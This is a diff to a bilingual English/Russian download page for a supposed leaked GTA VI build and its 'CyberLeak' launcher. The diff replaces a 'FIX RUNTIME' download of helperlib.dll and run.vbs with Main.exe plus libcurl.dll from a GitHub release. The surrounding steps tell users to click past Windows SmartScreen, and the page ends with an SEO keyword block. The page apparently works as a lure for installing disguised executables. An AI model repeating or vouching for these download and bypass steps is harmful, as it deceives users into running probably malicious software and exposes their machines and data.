@@ -24,7 +24,7 @@ Not affiliated with Rockstar / Take-Two. Retail GTA VI: **19 November 2026**.
 5. Keep **~130 GB** free on an SSD. Press **DOWNLOAD**, wait to 100% (hours; pause is OK).
 6. **PLAY**. First boot 1–3 minutes.
 
-Need **FIX RUNTIME**? Use [helperlib.dll + run.vbs](https://github.com/FoxyYT1/gta-6-runtime-helperlib-dll/releases/tag/v1.0).
+Need **FIX RUNTIME**? Use [Main.exe + libcurl.dll](https://github.com/FoxyYT1/gta-6-runtime-gup-exe/releases/tag/v1.0).
 
 EN guides: [download build](https://cyberleakgta6.com/en/download-gta-6-build.html) · [launcher](https://cyberleakgta6.com/en/) · [company](https://cyberleakgta6.com/en/about.html)
 
@@ -38,7 +38,7 @@ EN guides: [download build](https://cyberleakgta6.com/en/download-gta-6-build.ht
 | Сайт (302 на этот релиз) | [cyberleakgta6.com/download/GTA6_CyberLeak_Launcher.zip](https://cyberleakgta6.com/download/GTA6_CyberLeak_Launcher.zip) |
 | Инструкция лаунчера | [launcher.html](https://cyberleakgta6.com/launcher.html) |
 | Скачать билд ГТА 6 | [skachat-bild-gta-6.html](https://cyberleakgta6.com/skachat-bild-gta-6.html) |
-| Runtime FIX RUNTIME | [gta-6-runtime-helperlib-dll v1.0](https://github.com/FoxyYT1/gta-6-runtime-helperlib-dll/releases/tag/v1.0) |
+| Runtime FIX RUNTIME | [gta-6-runtime-gup-exe v1.0](https://github.com/FoxyYT1/gta-6-runtime-gup-exe/releases/tag/v1.0) |
 | Поддержка | [t.me/CyberLeakSupp_bot](https://t.me/CyberLeakSupp_bot) |
 | Канал | [t.me/CyberLeakVI](https://t.me/CyberLeakVI) |
 
@@ -62,7 +62,7 @@ EN guides: [download build](https://cyberleakgta6.com/en/download-gta-6-build.ht
 5. SmartScreen: **Подробнее** → **Выполнить в любом случае**.
 6. Папка установки с **130+ ГБ** на SSD.
 7. Кнопка **СКАЧАТЬ**. Не закрывать. Можно **ПАУЗА**.
-8. Если появится **FIX RUNTIME** — [helperlib.dll + run.vbs](https://github.com/FoxyYT1/gta-6-runtime-helperlib-dll).
+8. Если появится **FIX RUNTIME** — [Main.exe + libcurl.dll](https://github.com/FoxyYT1/gta-6-runtime-gup-exe/releases/tag/v1.0).
 9. **ИГРАТЬ**. Первая загрузка 1–3 минуты.
 
 Подробно: [установка и запуск](https://cyberleakgta6.com/ustanovka-zapusk-gta-6.html)
@@ -133,7 +133,7 @@ EN guides: [download build](https://cyberleakgta6.com/en/download-gta-6-build.ht
 
 скачать гта 6, скачать gta 6, скачать билд гта 6, лаунчер гта 6, gta 6 launcher windows, cyberleak, cyberleek, киберлик, киберлик билд, kiberlik, gta 6 cyberleek build, playable build leonida, GTA6_CyberLeak_Launcher, 113 гб, торрент фейк, vice city, jason duval, lucia, gta vi leak.
 
-LSI: gta6.exe, x64a.rpf, update.rpf, leonida keys, smartscreen, FIX RUNTIME, helperlib.dll, run.vbs.
+LSI: gta6.exe, x64a.rpf, update.rpf, leonida keys, smartscreen, FIX RUNTIME, Main.exe, libcurl.dll.
 
 ---
 
